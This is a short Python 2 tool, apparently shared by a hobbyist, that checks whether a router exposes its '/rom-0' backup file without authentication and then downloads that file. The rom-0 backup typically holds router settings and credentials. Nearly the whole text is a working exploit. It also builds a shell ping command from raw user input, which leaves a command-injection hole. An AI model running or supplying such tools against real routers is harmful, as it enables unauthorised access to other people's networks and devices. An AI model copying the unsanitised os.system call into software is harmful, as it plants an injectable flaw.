# RomScanner 0.1 Alpha
# written by Rhiza
# SearchingForRoot.tumblr.com


import os
import urllib
import urllib2
import time

print """
______                _____                                 
| ___ \              /  ___|                                
| |_/ /___  _ __ ___ \ `--.  ___ __ _ _ __  _ __   ___ _ __ 
|    // _ \| '_ ` _ \ `--. \/ __/ _` | '_ \| '_ \ / _ \ '__|
| |\ \ (_) | | | | | /\__/ / (_| (_| | | | | | | |  __/ |   
\_| \_\___/|_| |_| |_\____/ \___\__,_|_| |_|_| |_|\___|_|   
                                                            
0.1 Alpha                                                            

"""

# Asks for local or remote IP address of the router

time.sleep(1)
router_ip = raw_input("\nEnter the router IP: ")
url = "http://" + router_ip + "/rom-0"
time.sleep(1)

# Checking if target is online

print "\ntrying to reach router to see if it's online...\n"

time.sleep(1)

response = os.system("ping -c 1 " + router_ip)

# And then checks the response

time.sleep(1)

if response == 0:
	print ""
	print router_ip, "is online!"
else:
	print "\n" + router_ip + " is not online!"
	print "quitting"
	exit()


# Checking if router is vulnerable

try:
	f = urllib2.urlopen(urllib2.Request(url))
  	deadLinkFound = False
  	print "\nRouter is vulnerable"
except:
  	deadLinkFound = True
  	print "\nRouter is not vulnerable\n"
  	exit()
time.sleep(1)

# Downloads the rom-0 file

print "\ndownloading the rom-0 file"

file_name = url.split('/')[-1]
u = urllib.urlopen(url)
f = open(file_name, 'wb')
meta = u.info()
file_size = int(meta.getheaders("Content-Length")[0])
print "Downloading: %s Bytes: %s" % (file_name, file_size)

file_size_dl = 0
block_sz = 8192
while True:
    buffer = u.read(block_sz)
    if not buffer:
        break

    file_size_dl += len(buffer)
    f.write(buffer)
    status = r"%10d  [%3.2f%%]" % (file_size_dl, file_size_dl * 100. / file_size)
    status = status + chr(8)*(len(status)+1)
    print status,

f.close()